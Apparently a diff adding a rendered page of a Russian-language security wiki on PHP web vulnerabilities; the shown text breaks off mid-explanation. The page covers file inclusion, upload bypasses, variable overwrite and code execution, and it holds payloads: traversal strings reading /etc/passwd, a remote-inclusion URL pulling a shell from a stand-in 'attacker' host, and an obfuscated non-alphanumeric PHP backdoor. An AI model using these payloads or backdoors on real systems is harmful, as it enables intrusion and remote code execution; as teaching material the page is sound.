+      <a href="../../crypto/asymmetric/discrete-log/ecc.ru" class="md-nav__link">
+        ECC
+      </a>
+    </li>
+  
+
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+          
+            
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+        <input class="md-nav__toggle md-toggle" data-md-toggle="nav-4-2-3" type="checkbox" id="nav-4-2-3" >
+      
+      <label class="md-nav__link" for="nav-4-2-3">
+        Rsa
+        <span class="md-nav__icon md-icon"></span>
+      </label>
+      <nav class="md-nav" aria-label="Rsa" data-md-level="3">
+        <label class="md-nav__title" for="nav-4-2-3">
+          <span class="md-nav__icon md-icon"></span>
+          Rsa
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+          
+            
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../crypto/asymmetric/rsa/introduction.ru" class="md-nav__link">
+        Введение
+      </a>
+    </li>
+  
+
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+          
+            
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../crypto/asymmetric/knapsack.ru" class="md-nav__link">
+        Задача рюкзака
+      </a>
+    </li>
+  
+
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+  </ul>
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+            
+              
+              <div class="md-sidebar md-sidebar--secondary" data-md-component="toc" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+<nav class="md-nav md-nav--secondary" aria-label="Содержание">
+  
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Содержание
+    </label>
+    <ul class="md-nav__list" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#_1" class="md-nav__link">
+    Файл содержит
+  </a>
+  
+    <nav class="md-nav" aria-label="Файл содержит">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#_2" class="md-nav__link">
+    Локальный файл содержит
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_3" class="md-nav__link">
+    Удаленный файл содержит
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#file-upload" class="md-nav__link">
+    File Upload
+  </a>
+  
+    <nav class="md-nav" aria-label="File Upload">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#_4" class="md-nav__link">
+    Обход проверки загрузки
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#_5" class="md-nav__link">
+    Переменный охват
+  </a>
+  
+    <nav class="md-nav" aria-label="Переменный охват">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#_6" class="md-nav__link">
+    Переопределение глобальной переменной
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#extract" class="md-nav__link">
+    extract() переопределение переменной
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#import_request_variables" class="md-nav__link">
+    import_request_variables Переопределение переменной
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#parse_str" class="md-nav__link">
+    parse_str() переопределение переменной
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#_7" class="md-nav__link">
+    Выполнение команды
+  </a>
+  
+    <nav class="md-nav" aria-label="Выполнение команды">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#_8" class="md-nav__link">
+    Код прямого исполнения
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#preg_replace" class="md-nav__link">
+    preg_replace() Выполнение кода
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#preg_match" class="md-nav__link">
+    preg_match Выполнение кода
+  </a>
+  
+    <nav class="md-nav" aria-label="preg_match Выполнение кода">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#_get" class="md-nav__link">
+    Построить _GET чтение
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_get_1" class="md-nav__link">
+    Получить параметр _GET
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_9" class="md-nav__link">
+    Входящие параметры
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_10" class="md-nav__link">
+    Динамическое выполнение функции
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_11" class="md-nav__link">
+    Выполнение команды обратной кавычки
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_12" class="md-nav__link">
+    Фигурный синтаксис
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_13" class="md-nav__link">
+    Функция обратного вызова
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_14" class="md-nav__link">
+    Десериализация
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#php" class="md-nav__link">
+    PHP особенности
+  </a>
+  
+    <nav class="md-nav" aria-label="PHP особенности">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#_15" class="md-nav__link">
+    Массив
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_16" class="md-nav__link">
+    Волшебный хеш
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_17" class="md-nav__link">
+    Шестнадцатеричное преобразование
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_18" class="md-nav__link">
+    Преобразование типов
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_19" class="md-nav__link">
+    Свободность параметров встроенных функций
+  </a>
+  
+    <nav class="md-nav" aria-label="Свободность параметров встроенных функций">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#md5" class="md-nav__link">
+    md5()
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#strcmp" class="md-nav__link">
+    strcmp()
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#switch" class="md-nav__link">
+    switch()
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#in_array" class="md-nav__link">
+    in_array()
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#_20" class="md-nav__link">
+    Ищем резервную копию исходного кода
+  </a>
+  
+    <nav class="md-nav" aria-label="Ищем резервную копию исходного кода">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#hg" class="md-nav__link">
+    hg утечка исходного кода
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#git" class="md-nav__link">
+    Утечки исходного кода Git
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#ds_store" class="md-nav__link">
+    .DS_Store Утечка файла
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#-" class="md-nav__link">
+    Файл резервной копии веб-сайта
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#svn" class="md-nav__link">
+    Утечка SVN
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#web-inf-webxml" class="md-nav__link">
+    Утечка WEB-INF / web.xml
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#cvs" class="md-nav__link">
+    Утечка CVS
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_21" class="md-nav__link">
+    Рекомендации
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+          
+          <div class="md-content">
+            <article class="md-content__inner md-typeset">
+              
+                
+                  <a href="https://github.com/anakilivo/wiki/edit/main/docs/web/php.ru.md" title="Редактировать страницу" class="md-content__button md-icon">
+                    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20.71 7.04c.39-.39.39-1.04 0-1.41l-2.34-2.34c-.37-.39-1.02-.39-1.41 0l-1.84 1.83 3.75 3.75M3 17.25V21h3.75L17.81 9.93l-3.75-3.75L3 17.25z"/></svg>
+                  </a>
+                
+                
+                  <h1>PHP</h1>
+                
+                <ul>
+<li><a href="../php">english</a></li>
+</ul>
+<h2 id="_1">Файл содержит</h2>
+<p>Общие функции, которые вызывают включение файлов:</p>
+<ul>
+<li>PHP：<code>include()</code>，<code>include_once()</code>，<code>require()</code>，<code>require_once()</code>，<code>fopen()</code>，<code>readfile()</code></li>
+<li>JSP Servlet： <code>ava.io.File ()</code> ， <code>java.io.FileReader ()</code></li>
+<li>ASP：<code>includefile</code>，<code>includevirtual</code></li>
+</ul>
+<p>Когда PHP включает файл, он будет выполняться как код PHP, независимо от типа файла.</p>
+<h3 id="_2">Локальный файл содержит</h3>
+<p>Локальный файл содержит включение локального файла, LFI.</p>
+<div class="highlight"><pre><span></span><code><span class="cp">&lt;?php</span>
+    <span class="nv">$file</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;file&#39;</span><span class="p">];</span>
+    <span class="k">if</span> <span class="p">(</span><span class="nb">file_exists</span><span class="p">(</span><span class="s1">&#39;/home/wwwrun/&#39;</span><span class="o">.</span><span class="nv">$file</span><span class="o">.</span><span class="s1">&#39;.php&#39;</span><span class="p">))</span> <span class="p">{</span>
+        <span class="k">include</span> <span class="s1">&#39;/home/wwwrun/&#39;</span><span class="o">.</span><span class="nv">$file</span><span class="o">.</span><span class="s1">&#39;.php&#39;</span><span class="p">;</span>
+    <span class="p">}</span>
+<span class="cp">?&gt;</span><span class="x"></span>
+</code></pre></div>
+<p>В приведенном выше коде содержится локальный файл, а содержимое файла <code>/etc/passwd</code> можно прочитать, усекая %00.</p>
+<ul>
+<li>
+<p><code>%00</code> усечение</p>
+<pre><code>```text
+?file=../../../../../../../../../etc/passwd%00
+```
+
+Требуется `magic_quotes_gpc=off`, PHP менее 5.3.4.
+</code></pre>
+</li>
+<li>
+<p>Усечение длины пути</p>
+<pre><code>```text
+?file=../../../../../../../../../etc/passwd/././././././.[…]/./././././.
+```
+
+Linux требует, чтобы имя файла было длиннее 4096, а Windows должно быть длиннее 256.
+</code></pre>
+</li>
+<li>
+<p>Усечение числа точек</p>
+<pre><code>```text
+?file = ... / ... // ... // ... // ... / / boot.ini/ ……… [...] …………
+```
+
+Только для Windows количество точек должно быть больше 256.
+</code></pre>
+</li>
+</ul>
+<h3 id="_3">Удаленный файл содержит</h3>
+<p>Удаленный файл содержит Remote File Inclusion, RFI.</p>
+<div class="highlight"><pre><span></span><code><span class="cp">&lt;?php</span>
+    <span class="k">if</span> <span class="p">(</span><span class="nv">$route</span> <span class="o">==</span> <span class="s2">&quot;share&quot;</span><span class="p">)</span> <span class="p">{</span>
+      <span class="k">require_once</span> <span class="nv">$basePath</span> <span class="o">.</span> <span class="s2">&quot;/action/m_share.php&quot;</span><span class="p">;</span>
+    <span class="p">}</span> <span class="k">elseif</span> <span class="p">(</span><span class="nv">$route</span> <span class="o">==</span> <span class="s2">&quot;sharelink&quot;</span><span class="p">)</span> <span class="p">{</span>
+      <span class="k">require_once</span> <span class="nv">$basePath</span> <span class="o">.</span> <span class="s2">&quot;/action/m_sharelink.php&quot;</span><span class="p">;</span>
+    <span class="p">}</span>
+<span class="cp">?&gt;</span><span class="x"></span>
+</code></pre></div>
+<p>Создает значение переменной <code>basePath</code>.</p>
+<div class="highlight"><pre><span></span><code>/?basePath=http://attacker/phpshell.txt?
+</code></pre></div>
+<p>Заключительный код выполнен</p>
+<div class="highlight"><pre><span></span><code><span class="x">require_once &quot;http://attacker/phpshell.txt?/action/m_share.php&quot;;</span>
+</code></pre></div>
+<p>Часть после вопросительного знака интерпретируется как строка запроса URL-адреса, что также является своего рода
+«усечением».</p>
+<ul>
+<li>
+<p>Обычный удаленный файл содержит</p>
+<pre><code>```text
+?file=[http|https|ftp]://example.com/shell.txt
+```
+
+Необходимо `allow_url_fopen=On` и `allow_url_include=On`.
+</code></pre>
+</li>
+<li>
+<p>Использовать ввод потока PHP</p>
+<pre><code>```text
+?file=php://input
+```
+
+Необходимо `allow_url_include=On`.
+</code></pre>
+</li>
+<li>
+<p>Использовать фильтр потока PHP</p>
+<pre><code>```text
+?file=php://filter/convert.base64-encode/resource=index.php
+```
+
+Необходимо `allow_url_include=On`.
+</code></pre>
+</li>
+<li>
+<p>Использовать URI данных</p>
+<pre><code>```text
+?file=data://text/plain;base64,SSBsb3ZlIFBIUAo=
+```
+
+Необходимо `allow_url_include=On`.
+</code></pre>
+</li>
+<li>
+<p>Выполнить с XSS</p>
+<pre><code>```
+?file=http://127.0.0.1/path/xss.php?xss=phpcode
+```
+
+Необходимо `allow_url_fopen=On`, `allow_url_include=On` и брандмауэру или белому списку не разрешен доступ к 
+внешней сети, сначала найдите уязвимость XSS на том же сайте, включая эту страницу, вы можете ввести вредоносный
+код.
+</code></pre>
+</li>
+</ul>
+<h2 id="file-upload">File Upload</h2>
+<p>Уязвимость при загрузке файла возникает, когда пользователь загружает исполняемый файл сценария и получает возможность
+выполнять команды на стороне сервера через этот файл. В большинстве случаев уязвимости загрузки файлов обычно связаны с
+проблемой загрузки веб-сценария, который может быть проанализирован сервером, так называемой проблемы веб-оболочки. Для
+завершения этой атаке требуется несколько условий. Во-первых, загруженный файл может быть выполнен WEB-контейнером.
+Во-вторых, пользователь может получить доступ к файлу из WEB. Наконец, если загруженный файл был изменен проверкой
+безопасности, форматированием, сжатием изображения и тд. Содержимое может привести к сбою атаки.</p>
+<h3 id="_4">Обход проверки загрузки</h3>
+<ul>
+<li>
+<p>Расширение для проверки передней части</p>
+<pre><code>Захватите пакет и обойдите его.
+</code></pre>
+</li>
+<li>
+<p>Тип файла обнаружения <code>Content-Type</code></p>
+<pre><code>Захватите пакет, чтобы изменить тип `Content-Type` в соответствии с правилами белого списка.
+</code></pre>
+</li>
+<li>
+<p>Добавить суффикс к серверу</p>
+<pre><code>Попробуйте усечение %00.
+</code></pre>
+</li>
+<li>
+<p>Обнаружение расширения сервера</p>
+<pre><code>Воспользуйтесь уязвимостью.
+</code></pre>
+</li>
+<li>
+<p>Парсинг Apache</p>
+<pre><code>`phpshell.php.rar.rar.rar.rar` Поскольку Apache не знает `.rar` этого типа файла, он перейдет через суффикс к 
+`.php`, а затем подумает, что это файл PHP.
+</code></pre>
+</li>
+<li>
+<p>Разбор IIS</p>
+<pre><code>Если имя файла - `abc.asp;xx.jpg` в IIS 6, он будет проанализирован как `abc.asp`.
+</code></pre>
+</li>
+<li>
+<p>Разрешение пути PHP CGI</p>
+<pre><code>Когда вы посещаете `http://www.a.com/path/test.jpg/notexist.php`, `test.jpg` будет проанализирован как PHP,
+а `notexist.php` - несуществующий файл. На данный момент конфигурация Nginx следующая
+
+```nginx
+location ~ \.php$ {
+    root html;
+    fastcgi_pass 127.0.0.1:9000;
+    fastcgi_index index.php;
+    fastcgi_param SCRIPT_FILENAME /scripts$fastcgi_script_name;
+    include fastcgi_param;
+}
+```
+</code></pre>
+</li>
+<li>
+<p>другие методы</p>
+<pre><code>Регистр суффикса, двойная запись, специальный суффикс, такой как `php5` и тд, Изменяют содержимое пакета в WAF 
+и тд.
+</code></pre>
+</li>
+</ul>
+<h2 id="_5">Переменный охват</h2>
+<h3 id="_6">Переопределение глобальной переменной</h3>
+<p>Неинициализированные переменные, которые могут контролироваться пользователем, могут вызвать проблемы с безопасностью.</p>
+<div class="highlight"><pre><span></span><code>register_globals = ON
+</code></pre></div>
+<p>пример</p>
+<div class="highlight"><pre><span></span><code><span class="cp">&lt;?php</span>
+    <span class="k">echo</span> <span class="s2">&quot;Register_globals&quot;</span> <span class="o">.</span> <span class="p">(</span><span class="nx">int</span><span class="p">)</span><span class="nb">ini_get</span><span class="p">(</span><span class="s2">&quot;register_globals&quot;</span><span class="p">)</span> <span class="o">.</span> <span class="s2">&quot;&lt;br/&gt;&quot;</span><span class="p">;</span>
+    <span class="k">if</span> <span class="p">(</span><span class="nv">$auth</span><span class="p">)</span> <span class="p">{</span>
+        <span class="k">echo</span> <span class="s2">&quot;private!&quot;</span><span class="p">;</span>
+    <span class="p">}</span>
+<span class="cp">?&gt;</span><span class="x"></span>
+</code></pre></div>
+<p>Когда <code>register_globals=ON</code>, отправьте <code>test.php?auth=1</code>, автоматически будет назначена переменная <code>auth</code>.</p>
+<h3 id="extract"><code>extract()</code> переопределение переменной</h3>
+<p>Функция <code>extract()</code> может импортировать переменные из массива в текущую таблицу символов, которая определяется как</p>
+<div class="highlight"><pre><span></span><code>int extract(array $var_array [, int $extract_type [, string $prefix ]] )
+</code></pre></div>
+<p>Второй параметр определяет поведение функции при ее импорте в таблицу символов. Два наиболее распространенных значения
+- <code>EXTR_OVERWRITE</code> и <code>EXTR_SKIP</code>.</p>
+<p>Если значение равно <code>EXTR_OVERWRITE</code>, в процессе импорта переменных в таблицу символов, если имя переменной конфликтует,
+все переменные перезаписываются; значение <code>EXTR_SKIP</code> означает пропуск без перезаписи. Если второй параметр не указан,
+по умолчанию используется <code>EXTR_OVERWRITE</code>.</p>
+<div class="highlight"><pre><span></span><code><span class="cp">&lt;?php</span>
+    <span class="nv">$auth</span> <span class="o">=</span> <span class="s2">&quot;0&quot;</span><span class="p">;</span>
+    <span class="nb">extract</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">);</span>
+    <span class="k">if</span> <span class="p">(</span><span class="nv">$auth</span> <span class="o">==</span> <span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
+        <span class="k">echo</span> <span class="s2">&quot;private!&quot;</span><span class="p">;</span>
+    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+        <span class="k">echo</span> <span class="s2">&quot;public!&quot;</span><span class="p">;</span>
+    <span class="p">}</span>
+<span class="cp">?&gt;</span><span class="x"></span>
+</code></pre></div>
+<p>Покрытие переменных может возникнуть, когда функция <code>extract()</code> экспортирует переменные из массива, которым может
+управлять пользователь.</p>
+<h3 id="import_request_variables"><code>import_request_variables</code> Переопределение переменной</h3>
+<div class="highlight"><pre><span></span><code>bool import_request_variables(string $types [, string $prefix])
+</code></pre></div>
+<p><code>import_request_variables</code> Импортирует переменные из GET, POST и файлов cookie в глобальный. Используйте эту функцию,
+чтобы просто указать тип.</p>
+<div class="highlight"><pre><span></span><code><span class="cp">&lt;?php</span>
+    <span class="nv">$auth</span> <span class="o">=</span> <span class="s2">&quot;0&quot;</span><span class="p">;</span>
+    <span class="nb">import_request_variables</span><span class="p">(</span><span class="s2">&quot;G&quot;</span><span class="p">);</span>
+    <span class="k">if</span> <span class="p">(</span><span class="nv">$auth</span> <span class="o">==</span> <span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
+        <span class="k">echo</span> <span class="s2">&quot;private!&quot;</span><span class="p">;</span>
+    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+        <span class="k">echo</span> <span class="s2">&quot;public!&quot;</span><span class="p">;</span>
+    <span class="p">}</span>
+<span class="cp">?&gt;</span><span class="x"></span>
+</code></pre></div>
+<p><code>import_request_variables("G")</code> указывает переменные, которые будут импортированы в запрос GET, и отправляет тестовое
+покрытие <code>test.php?auth=1</code>.</p>
+<h3 id="parse_str"><code>parse_str()</code> переопределение переменной</h3>
+<div class="highlight"><pre><span></span><code>void parse_str(string $str [, array &amp;$arr ])
+</code></pre></div>
+<p>Функция <code>parse_str()</code> обычно используется для синтаксического анализа строки запроса в URL-адресе, но когда значение
+параметра может контролироваться пользователем, это может вызвать покрытие переменных.</p>
+<div class="highlight"><pre><span></span><code><span class="x">//var.php?var=new variable override</span>
+<span class="x">$var = &quot;init&quot;;</span>
+<span class="x">parse_str($_SERVER[&quot;QUERY_STRING&quot;]);</span>
+<span class="x">print $var;</span>
+</code></pre></div>
+<p>Функции, подобные <code>parse_str()</code>, также имеют <code>mb_parse_str()</code>.</p>
+<h2 id="_7">Выполнение команды</h2>
+<h3 id="_8">Код прямого исполнения</h3>
+<p>В PHP есть довольно много функций, которые могут выполнять код напрямую.</p>
+<div class="highlight"><pre><span></span><code><span class="x">eval();</span>
+<span class="x">assert();</span>
+<span class="x">system();</span>
+<span class="x">exec();</span>
+<span class="x">shell_exec();</span>
+<span class="x">passthru();</span>
+<span class="x">escapeshellcmd();</span>
+<span class="x">pcntl_exec();</span>
+<span class="x">......</span>
+</code></pre></div>
+<h3 id="preg_replace"><code>preg_replace()</code> Выполнение кода</h3>
+<p>Первый аргумент <code>preg_replace()</code> разрешает выполнение кода, если присутствует модификатор режима <code>/e</code>.</p>
+<div class="highlight"><pre><span></span><code><span class="cp">&lt;?php</span>
+    <span class="nv">$var</span> <span class="o">=</span> <span class="s2">&quot;&lt;tag&gt;phpinfo()&lt;/tag&gt;&quot;</span><span class="p">;</span>
+    <span class="nb">preg_replace</span><span class="p">(</span><span class="s2">&quot;/&lt;tag&gt;(.*?)&lt;/tag&gt;/e&quot;</span><span class="p">,</span> <span class="s2">&quot;addslashes(1)&quot;</span><span class="p">,</span> <span class="nv">$var</span><span class="p">);</span>
+<span class="cp">?&gt;</span><span class="x"></span>
+</code></pre></div>
+<p>Если у вас нет модификатора <code>/e</code>, вы можете попробовать усечение %00.</p>
+<h3 id="preg_match"><code>preg_match</code> Выполнение кода</h3>
+<p><code>preg_match</code> выполняет сопоставление регулярного выражения, позволяя выполнить код в случае успешного сопоставления.</p>
+<div class="highlight"><pre><span></span><code><span class="cp">&lt;?php</span>
+    <span class="k">include</span> <span class="s1">&#39;flag.php&#39;</span><span class="p">;</span>
+    <span class="k">if</span><span class="p">(</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;code&#39;</span><span class="p">])){</span>
+        <span class="nv">$code</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;code&#39;</span><span class="p">];</span>
+        <span class="k">if</span><span class="p">(</span><span class="nb">strlen</span><span class="p">(</span><span class="nv">$code</span><span class="p">)</span><span class="o">&gt;</span><span class="mi">40</span><span class="p">){</span>
+            <span class="k">die</span><span class="p">(</span><span class="s2">&quot;Long.&quot;</span><span class="p">);</span>
+        <span class="p">}</span>
+        <span class="k">if</span><span class="p">(</span><span class="nb">preg_match</span><span class="p">(</span><span class="s2">&quot;/[A-Za-z0-9]+/&quot;</span><span class="p">,</span> <span class="nv">$code</span><span class="p">)){</span>
+            <span class="k">die</span><span class="p">(</span><span class="s2">&quot;NO.&quot;</span><span class="p">);</span>
+        <span class="p">}</span>
+        <span class="o">@</span><span class="k">eval</span><span class="p">(</span><span class="nv">$code</span><span class="p">);</span>
+    <span class="p">}</span><span class="k">else</span><span class="p">{</span>
+        <span class="nb">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
+    <span class="p">}</span>
+    <span class="c1">//$hint =  &quot;php function getFlag() to get flag&quot;;</span>
+<span class="cp">?&gt;</span><span class="x"></span>
+</code></pre></div>
+<p>Этот вопрос — вопрос от мастера сливового вина во время тренировки <code>xman</code>. Эта серия описаний кода выглядит так. Мы
+хотим обойти передачу обычных чисел и буквенных строк, таких как <code>AZ</code>, <code>az</code>, <code>0–9</code>, и преобразовать не буквенно-цифровые
+символы в различные преобразования. Можно создать любой символ в <code>az</code>, а длина строки меньше <code>40</code>. Затем
+используйте <code>PHP</code>, чтобы разрешить динамические функции выполнения функций, сшить имя функции, здесь мы <code>getFlag</code>, а
+затем динамически выполнить код.</p>
+<p>Итак, вопрос, который нам нужно рассмотреть, заключается в том, как передавать различные преобразования, чтобы мы могли
+успешно прочитать функцию <code>getFlag</code> и получить <code>веб-оболочку</code>.</p>
+<p>Прежде чем мы это поймем, нам сначала нужно понять концепцию XOR <code>^</code> в <code>PHP</code>.</p>
+<p>Давайте посмотрим на следующий код:</p>
+<div class="highlight"><pre><span></span><code><span class="cp">&lt;?php</span>
+    <span class="k">echo</span> <span class="s2">&quot;A&quot;</span> <span class="o">^</span> <span class="s2">&quot;?&quot;</span><span class="p">;</span>
+<span class="cp">?&gt;</span><span class="x"></span>
+</code></pre></div>
+<p><img alt="answer1" src="../../assets/img/web/answer1.png" /></p>
+<p>Мы видим, что на выходе получается символ <code>~</code>. Причина этого в том, что код <code>A</code> и символ <code>?</code> выполняются XOR в коде.
+В <code>PHP</code>, когда две переменные подвергаются операции XOR, строка сначала преобразуется в значение <code>ASCII</code>, затем
+значение <code>ASCII</code> преобразуется в двоичное, а затем выполняется операция XOR, выполняется операция XOR, а результат
+преобразуется из двоичного. Станьте значением <code>ASCII</code> и преобразуйте значение <code>ASCII</code> в строку. Операции XOR также
+иногда используются для обмена значениями двух переменных.</p>
+<p>Как в примере выше</p>
+<p>Значение <code>ASCII</code> для <code>A</code> - <code>65</code>, а соответствующее двоичное значение - <code>01000001</code>.</p>
+<p>Значение ASCII <code>?</code> равно <code>63</code>, а соответствующее двоичное значение - <code>00111111</code>.</p>
+<p>Значение двоичного кода исключающего ИЛИ - <code>01111110</code>, соответствующее значение <code>ASCII</code> - <code>126</code>, а соответствующее
+строковое значение - <code>~</code>.</p>
+<p>Все мы знаем, что <code>PHP</code> - это слабо типизированный язык, то есть в <code>PHP</code> мы можем объявить переменную напрямую и
+инициализировать или присвоить ее, не объявляя тип переменной. Именно из-за слабого типа <code>PHP</code> мы неявно конвертируем
+переменный тип <code>PHP</code> и используем эту возможность для выполнения некоторых нетрадиционных операций. Если вы
+преобразовываете целое число в строку, обрабатываете логическое значение как целое число или обрабатываете строку как
+функцию, давайте посмотрим на фрагмент кода:</p>
+<div class="highlight"><pre><span></span><code><span class="cp">&lt;?php</span>
+    <span class="k">function</span> <span class="nf">B</span><span class="p">(){</span>
+        <span class="k">echo</span> <span class="s2">&quot;Hello Angel_Kitty&quot;</span><span class="p">;</span>
+    <span class="p">}</span>
+    <span class="nv">$_</span><span class="o">++</span><span class="p">;</span>
+    <span class="nv">$__</span><span class="o">=</span> <span class="s2">&quot;?&quot;</span> <span class="o">^</span> <span class="s2">&quot;}&quot;</span><span class="p">;</span>
+    <span class="nv">$__</span><span class="p">();</span>
+<span class="cp">?&gt;</span><span class="x"></span>
+</code></pre></div>
+<p><img alt="answer2" src="../../assets/img/web/answer2.png" /></p>
+<p>Давайте вместе проанализируем приведенный выше код:</p>
+<ol>
+<li><code>$_++;</code> Эта строка кода означает увеличение переменной с именем <code>"_"</code>, значения по умолчанию переменной undefined
+   в <code>PHP</code> <code>null</code>, <code>null == False == 0</code>, мы можем получить число, автоматически увеличивая неопределенную переменную без
+   использования каких-либо чисел.</li>
+<li><code>$__= "?" ^ "}";</code> XOR персонажей <code>?</code> and <code>}</code> и получите результат <code>B</code>, присвоенный переменной с именем <code>__</code> (два
+   символа подчеркивания)</li>
+<li><code>$__();</code> Благодаря вышеуказанной операции присваивания значение переменной <code>$__</code> равно <code>B</code>, поэтому эту строку можно
+   рассматривать как <code>B()</code>. В <code>PHP</code> эта строка кода представляет, что функция <code>B</code> вызывается, поэтому результат - 
+   <code>Hello Angel_Kitty</code>. В <code>PHP</code> мы можем рассматривать строки как функции.</li>
+</ol>
+<p>Видя это, я считаю, что если вы видите похожий бэкдор <code>PHP</code>, не стоит так запутываться. Вы можете использовать анализ
+предложений кода бэкдора, чтобы понять, какие функции бэкдор хочет выполнять.</p>
+<p>Мы хотим использовать этот бэкдор для создания строк, которые обходят обнаружение и полезны для нас, таких, как <code>_POST</code>,
+<code>system</code>, <code>call_user_func_array</code> или все, что нам нужно.</p>
+<p>Вот очень простой не буквенно-цифровой бэкдор <code>PHP</code>:</p>
+<div class="highlight"><pre><span></span><code><span class="cp">&lt;?php</span>
+    <span class="o">@</span><span class="nv">$_</span><span class="o">++</span><span class="p">;</span> <span class="c1">// $_ = 1</span>
+    <span class="nv">$__</span> <span class="o">=</span> <span class="p">(</span><span class="s2">&quot;#&quot;</span> <span class="o">^</span> <span class="s2">&quot;|&quot;</span><span class="p">);</span> <span class="c1">// $__ = _</span>
+    <span class="nv">$__</span> <span class="o">.=</span> <span class="p">(</span><span class="s2">&quot;.&quot;</span> <span class="o">^</span> <span class="s2">&quot;~&quot;</span><span class="p">);</span> <span class="c1">// _P</span>
+    <span class="nv">$__</span> <span class="o">.=</span> <span class="p">(</span><span class="s2">&quot;/&quot;</span> <span class="o">^</span> <span class="s2">&quot;`&quot;</span><span class="p">);</span> <span class="c1">// _PO</span>
+    <span class="nv">$__</span> <span class="o">.=</span> <span class="p">(</span><span class="s2">&quot;|&quot;</span> <span class="o">^</span> <span class="s2">&quot;/&quot;</span><span class="p">);</span> <span class="c1">// _POS</span>
+    <span class="nv">$__</span> <span class="o">.=</span> <span class="p">(</span><span class="s2">&quot;{&quot;</span> <span class="o">^</span> <span class="s2">&quot;/&quot;</span><span class="p">);</span> <span class="c1">// _POST </span>
+    <span class="nv">${$__}</span><span class="p">[</span><span class="o">!</span><span class="nv">$_</span><span class="p">](</span><span class="nv">${$__}</span><span class="p">[</span><span class="nv">$_</span><span class="p">]);</span> <span class="c1">// $_POST[0]($_POST[1]);</span>
+<span class="cp">?&gt;</span><span class="x"></span>
+</code></pre></div>
+<p>Здесь я объясняю, <code>.=</code> - это строковое соединение, подробности см. в синтаксисе <code>PHP</code>.</p>
+<p>Мы даже можем объединить приведенный выше код в одну строку, сделав программу менее читаемой, код выглядит следующим
+образом:</p>
